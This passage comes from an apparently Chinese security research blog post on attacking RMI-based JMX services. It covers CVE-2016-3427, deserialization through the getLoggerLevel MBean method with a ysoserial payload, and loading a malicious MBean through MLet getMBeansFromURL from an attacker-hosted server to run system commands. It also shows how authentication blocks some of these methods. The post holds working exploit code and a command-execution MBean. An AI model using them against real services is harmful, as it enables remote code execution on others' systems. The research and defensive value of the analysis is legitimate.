src="/img/How-to-attack-RMI-based-JMX-services/14.png"></p><p>javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper实现DeserializationChecker接口</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/15.png"></p><p>JMX服务端调用sun.rmi.server.UnicastServerRef#unmarshalParameters还原newClient的参数：由于实现了DeserializationChecker接口，所以会走checked流程。普通RMI服务的自定义方法会走unchecked流程</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/16.png"></p><p>服务端执行反序列化操作还原参数检查白名单：javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#check</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/17.png"></p><p>此漏洞被分配编号<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427">CVE-2016-3427</a>，在JDK8u91时被<a href="https://www.oracle.com/java/technologies/javase/8u91-relnotes.html">修复</a></p><h3 id="2-4-JMX层MBean方法getLoggerLevel-x2F-gcClassHistogram利用方式"><a href="#2-4-JMX层MBean方法getLoggerLevel-x2F-gcClassHistogram利用方式" class="headerlink" title="2.4 JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式"></a>2.4 JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式</h3><p>当JMX客户端调用createMBean&#x2F;getObjectInstance&#x2F;invoke等方法时，服务端处理时会先经过sun.rmi.server.UnicastServerRef#dispatch进行分发，当不执行RMI内置的bind&#x2F;lookup&#x2F;dirty方法时，会进入”调用自定义方法”的逻辑</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/18.png"></p><p>客户端调用createMBean&#x2F;getAttribute等内置方法时，服务端到达javax.management.remote.rmi.RMIConnectionImpl#invoke中：</p><p>1、调用java.rmi.MarshalledObject#get还原参数值</p><p>2、调用到javax.management.remote.rmi.RMIConnectionImpl#doOperation根据客户端调用具体方法进行分发处理，包括createMBean、getAttribute、getObjectInstance、getObjectInstance等方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/19.png"></p><p>java.rmi.MarshalledObject#get</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/20.png"></p><p>javax.management.remote.rmi.RMIConnectionImpl#doOperation</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/21.png"></p><p>在使用java.rmi.MarshalledObject#get还原调用方法的参数值时，会直接调用readObject进行反序列化操作。我们只需要找到MBean中带参数的方法，将我们的恶意数据填充即可，对应exp为ysoserial中的ysoserial.exploit.JMXInvokeMBean，该exp通过调用对象名称为”java.util.logging:type&#x3D;Logging”的MBean的getLoggerLevel方法触发</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String servicePort = <span class="hljs-string">&quot;2222&quot;</span>;<br>JMXServiceURL url = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">servicePort</span> +  <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector jmxConnector = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(url);<br>MBeanServerConnection mbeanServerConnection = jmxConnector.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br>Object payloadObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utils</span>.</span></span>make<span class="hljs-constructor">PayloadObject(<span class="hljs-string">&quot;Groovy1&quot;</span>, <span class="hljs-string">&quot;mspaint.exe&quot;</span>)</span>;<br>ObjectName mbeanName = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectName(<span class="hljs-string">&quot;java.util.logging:type=Logging&quot;</span>)</span>;<br>mbeanServerConnection.invoke(mbeanName, <span class="hljs-string">&quot;getLoggerLevel&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;payloadObject&#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">CanonicalName()</span>&#125;);<br>jmxConnector.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/22.png"></p><p>jconsole查看java.util.logging:type&#x3D;Logging为默认的MBean，另外还有很多MBean的方法也可以用：java.lang:type&#x3D;Threading#getThreadCpuTime、java.lang:type&#x3D;Threading#getThreadInfo、com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogram等等</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/23.png"></p><p>com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogram利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/24.png"></p><h3 id="2-5-MLET动态加载Evil-MBean利用方式"><a href="#2-5-MLET动态加载Evil-MBean利用方式" class="headerlink" title="2.5 MLET动态加载Evil MBean利用方式"></a>2.5 MLET动态加载Evil MBean利用方式</h3><p>除了利用本身存在的MBean，我们也可以自行添加MBean进行利用，可以使用<code>javax.management.loading.MLet</code> MBean 并调用其getMBeansFromURL操作指示JMX服务端从远端加载注册构建的恶意MBean，这样就可以调用我们创建的的MBean操作而不需要服务端ClassPath存在Gadget。这种从外部加载MBean的方式在官方也有说明 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html</a></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/25.png"></p><p>分析下getMBeansFromURL方法是如何操作的，javax.management.loading.MLet#getMBeansFromURL(java.lang.String)中分为2步：</p><p>1、加载mlet文件解析标签</p><p>2、当创建MBean指定的class在本地ClassPath中找不到时，则使用MLET classloader去外部地址（第一步得到的codebase+archive属性值）进行加载</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/26.png"></p><p>javax.management.loading.MLetParser#parse解析<code>&lt;mlet&gt;</code>标签的内容并放入attributes</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/27.png"></p><p>接着返回到getMBeansFromURL方法调用com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean创建MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/28.png"></p><p>调用到com.sun.jmx.interceptor.DefaultMBeanServerInterceptor#createMBean创建MBean时，会检查是否有instantiate、registerMBean权限。如果未开启SecurityManager，则会跳过检查</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/29.png"></p><p>最终在 com.sun.jmx.mbeanserver.MBeanInstantiator#loadClass中使用MLET classloader去加载org.example.Evil类（codesource就是mlet文件中codebase+archive属性值）。这里使用<code>Class.forName(className, false, loader);</code>初始化的选项为false，不会执行静态代码块中的代码。所以我们需要选择invoke调用MBean的恶意方法进行利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/30.png"></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/31.png"></p><p>针对前文在2222端口开启的JMX服务，复现下MLET这种利用方法：</p><p>1、创建Evil类及EvilMBean接口（恶意操作为runCommand），并将其打包为JmxEvilBean.jar</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//EvilMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">EvilMBean</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd);<br>&#125;<br><br><span class="hljs-comment">//Evil.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">EvilMBean</span></span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd)<br>    &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            Process proc = rt.exec(cmd);<br>            BufferedReader stdInput = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getInputStream()));<br>            BufferedReader stdError = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getErrorStream()));<br>            <span class="hljs-keyword">String</span> stdout_err_data = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">String</span> s;<br>            <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">while</span> ((s = stdError.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            proc.waitFor();<br>            <span class="hljs-keyword">return</span> stdout_err_data;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)<br>        &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2、创建MLET文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;mlet <span class="hljs-attribute">code</span>=<span class="hljs-string">&quot;org.example.Evil&quot;</span> <span class="hljs-attribute">archive</span>=<span class="hljs-string">&quot;JmxEvilBean.jar&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;MLetCompromise:name=evil,id=10&quot;</span> <span class="hljs-attribute">codebase</span>=<span class="hljs-string">&quot;http://192.168.232.1:3333&quot;</span>&gt;&lt;/mlet&gt;<br></code></pre></td></tr></table></figure><p>将JmxEvilBean.jar、mlet文件放在web服务下：python -m SimpleHTTPServer 3333</p><p>3、EXP利用：连接服务、创建MLet MBean、invoke调用getMBeansFromURL加载外部Evil MBean、invoke调用Evil MBean的runCommand操作返回执行结果</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String port = <span class="hljs-string">&quot;2222&quot;</span>;<br>String command = <span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-comment">//1、连接JMX服务</span><br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">port</span> + <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-comment">//2、创建MBean,类为javax.management.loading.MLet、name为test.Mbean:type=MLet,id=1</span><br>ObjectInstance evil = m.create<span class="hljs-constructor">MBean(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-params">new</span> ObjectName(<span class="hljs-string">&quot;test.Mbean:type=MLet,id=1&quot;</span>)</span>);<br><span class="hljs-comment">//3、调用MBean的getMBeansFromURL操作，从http://192.168.232.1:3333/mlet加载mlet文件创建新的MBean</span><br>Object res = m.invoke(evil.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;getMBeansFromURL&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;http://192.168.232.1:3333/mlet&quot;</span>&#125;,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span> &#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125; );<br><br>HashSet res_set = ((HashSet)res);<br>Iterator itr = res_set.iterator<span class="hljs-literal">()</span>;<br>Object nextObject = itr.next<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//4、invoke调用新的MBean的runCommand操作并返回结果</span><br>ObjectInstance evil_bean = ((ObjectInstance)nextObject);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Loaded class: &quot;</span>+evil_bean.get<span class="hljs-constructor">ClassName()</span>+<span class="hljs-string">&quot; object &quot;</span>+evil_bean.get<span class="hljs-constructor">ObjectName()</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Calling runCommand with: &quot;</span>+command);<br>Object result = m.invoke(evil_bean.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;runCommand&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123; command &#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125;);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Result: &quot;</span>+result);<br></code></pre></td></tr></table></figure><p>exp运行后，可以在jconsole中看到创建的test.Mbean:type&#x3D;MLet,id&#x3D;1、MLetCompromise:name&#x3D;evil,id&#x3D;10 MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/32.png"></p><p>EXP也回显了ipconfig命令执行的结果</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/33.png"></p><p>需要注意的是：当服务未重启的情况下，后续利用直接invoke调用runCommand就可以了，不需要再次创建MBean</p><h2 id="3、密码验证"><a href="#3、密码验证" class="headerlink" title="3、密码验证"></a>3、密码验证</h2><p>第二章节分析的是JMX服务未开启权限验证及SSL验证时的漏洞利用情况，另外分析下当开启权限验证时漏洞利用的情况有什么变化。默认启动JMX管理服务时（不指定com.sun.management.jmxremote.authenticate配置），远程客户端连接时就需要通过验证。而验证所需的密码-权限是以明文存储在服务端&#x2F;jre&#x2F;lib&#x2F;management&#x2F;目录的jmxremote.password、jmxremote.access文件中的，且需要设置这两个文件的权限为：除文件所有者具有控制权，其它用户无任何权限。否则启动时会报错：sun.management.AgentConfigurationError。如下是启动命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span> -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure><p>启动截图及文件权限如下：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/34.png"></p><p>使用客户端jconsole 以只读账户guest password1进行连接</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/35.png"></p><p>也可以使用JAVA代码连接：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">HashMap env = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;<br>env.put(<span class="hljs-string">&quot;jmx.remote.credentials&quot;</span>,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;guest&quot;</span>,<span class="hljs-string">&quot;password1&quot;</span>&#125;);<br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u,env);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(m.get<span class="hljs-constructor">MBeanCount()</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/36.png"></p><p>文件权限设置参考：<a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html</a></p><p>分析下当加入权限验证后，JMX服务端的检测逻辑是怎样的？当我们获取了一个低权限&#x2F;只读权限账户时可以做哪些事情？我们从连接服务端到执行MBean操作的整体流程来看，分为几步：</p><p>1、客户端使用javax.naming.InitialContext#lookup获取到名称为”jmxrmi”的 Stub代理对象，即下图的变量server；</p><p>2、客户端调用javax.management.remote.rmi.RMIServer#newClient去获取RMIConnectionImpl Stub代理对象，服务端javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#newClient执行JAAS-based authenticator进行权限校验：根据服务的启动参数及jmxremote.password、jmxremote.access配置文件去匹配，当校验通过后返回代理对象，即下图的变量c；</p><p>3、客户端invoke调用RMIConnectionImpl Stub代理对象的方法去操作MBean&#x2F;获取MBean信息。在另一边的JMX服务端会根据objid确认处理客户端此次请求逻辑的Target，[0:0:0,0]、[0:0:0,2] 这是在之前攻击RMI中分析过的RegistryImpl_Stub、DGCImpl_Stub，而涉及JMX是另外几个Target，在本实例中的objID为：[613d5ccd:18470553d20:-7fff, -4868886411976892153]、[613d5ccd:18470553d20:-7ffa, -8893277592355947578]，如下图是客户端拿到两次请求的返回对象调试情况</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/37.png"></p><p>当调用MBean的具体操作方法时，如javax.management.remote.rmi.RMIConnection#getConnectionId，在服务端会调用到javax.management.remote.rmi.RMIConnectionImpl#getConnectionId进行处理</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/38.png"></p><p>添加鉴权前后，由于服务端在启动时添加的Target不同，在添加鉴权后 mbeanServer的值从DefaultMBeanServerInterceptor变为MBeanServerAccessController，对于每个操作具体需要的权限都在MBeanServerAccessController中进行判断（objid与上面演示的不同，因为是后面的补图）</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/39.png"></p><p>无鉴权时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.interceptor</span>.DefaultMBeanServerInterceptor<span class="hljs-selector-id">#createMBean</span>(<br>....<br></code></pre></td></tr></table></figure><p>有鉴权时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.security</span>.MBeanServerAccessController<span class="hljs-selector-id">#createMBean</span>   当加上鉴权后在这里发生了变化<br>...<br></code></pre></td></tr></table></figure><p>翻了下源码统计下jmx配置文件中的权限可对应调用MBean的哪些操作。这些操作可以辅助我们对JMX服务进行进一步的测试：</p><p>read权限可执行的操作</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">getAttribute、getAttributes、getDefaultDomain、getDomains、getMBeanCount、getMBeanInfo、getObjectInstance、isInstanceOf、isRegistered、<span class="hljs-keyword">query</span>MBeans、<span class="hljs-keyword">query</span>Names、addNotificationListener、removeNotificationListener<br></code></pre></td></tr></table></figure><p>Write权限可执行的操作</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span>Attribute、<span class="hljs-keyword">set</span>Attributes<br></code></pre></td></tr></table></figure><p>Unregister权限可执行的操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">unregisterMBean</span><br></code></pre></td></tr></table></figure><p>write权限、非MLet#addURL&#x2F;getMBeansFromURL方法可执行的操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">invoke</span><br></code></pre></td></tr></table></figure><p>read权限可以执行查询操作，如列出全部MBean的信息</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/40.png"></p><p>我们以低权限账户guest登录后再次测试如上几种利用方式</p><h3 id="3-1-影响地址可控的JNDI注入-amp-RMI-Registry利用方式-amp-CVE-2016-3427"><a href="#3-1-影响地址可控的JNDI注入-amp-RMI-Registry利用方式-amp-CVE-2016-3427" class="headerlink" title="3.1 影响地址可控的JNDI注入 &amp; RMI Registry利用方式 &amp; CVE-2016-3427"></a>3.1 影响地址可控的JNDI注入 &amp; RMI Registry利用方式 &amp; CVE-2016-3427</h3><p>地址可控的JNDI注入利用在密码鉴权流程之前，与是否鉴权无关，只与JDK版本有关</p><p>RMI方式的利用在密码鉴权流程之前，与是否鉴权无关，只与JDK版本有关</p><p>CVE-2016-3427是在RMI层-还原自定义方法的参数时触发的，与是否鉴权无关，只与JDK版本有关</p><h3 id="3-2-影响JMX层MBean方法的利用方式"><a href="#3-2-影响JMX层MBean方法的利用方式" class="headerlink" title="3.2 影响JMX层MBean方法的利用方式"></a>3.2 影响JMX层MBean方法的利用方式</h3><p>由于通过JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式是在javax.management.remote.rmi.RMIConnectionImpl#invoke 还原参数时触发的漏洞，并未执行到判断权限的位置。所以使用只读权限的guest账户即可继续进行利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/41.png"></p><h3 id="3-3-影响MLET加载Evil-MBean利用方式"><a href="#3-3-影响MLET加载Evil-MBean利用方式" class="headerlink" title="3.3 影响MLET加载Evil MBean利用方式"></a>3.3 影响MLET加载Evil MBean利用方式</h3><p>当未授权情况下JMX服务下MLET方式利用的步骤</p><p>1、客户端调用<code>JMXConnectorFactory.connect</code>连接到JMX服务端</p><p>2、调用createMBean创建javax.management.loading.MLet MBean</p><p>3、invoke调用MLet#getMBeansFromURL操作从外部获取Evil MBean</p><p>4、invoke调用Evil MBean的runCommand操作执行命令</p><p>当以低权限账户登录后，在第2步com.sun.jmx.remote.security.MBeanServerAccessController#createMBean创建bean的起点使用<code>checkCreate(className)</code>检查权限，执行到com.sun.jmx.remote.security.MBeanServerFileAccessController#checkAccess代码逻辑：1、获取当前登录用户的权限；2、判断权限是否包括create权限；3、如果无create权限或未登录用户则报错：<code>Access denied! Invalid access level for requested MBeanServer operation</code></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/42.png"></p><p>而我们登录使用的guest用户只有read权限，没法执行createBean操作，所以在执行EXP的客户端报错：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/43.png"></p><p>另外如果登录用户有create权限还是不能invoke调用MLet#getMBeansFromURL操作的，因为在invoke前会检查write、MLetMethods权限，write权限与上面判断read权限的流程一致，而MLetMethods权限是在com.sun.jmx.remote.security.MBeanServerAccessController#checkMLetMethods中判断的，如果调用javax.management.loading.MLet的addURL&#x2F;getMBeansFromURL都会报错退出</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/44.png"></p><h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273</a></p><p><a href="https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/">https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/</a></p><p><a href="https://www.cnblogs.com/afanti/p/12468693.html">https://www.cnblogs.com/afanti/p/12468693.html</a></p><p><a href="https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl">https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl</a></p><p><a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p><p><a href="https://pwnull.github.io/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/">https://pwnull.github.io/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JMX</tag>
      
      <tag>JavaSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>当我们谈论JNDI注入时，我们在谈论什么</title>
    <link href="/2022/jndi-injection-history/"/>
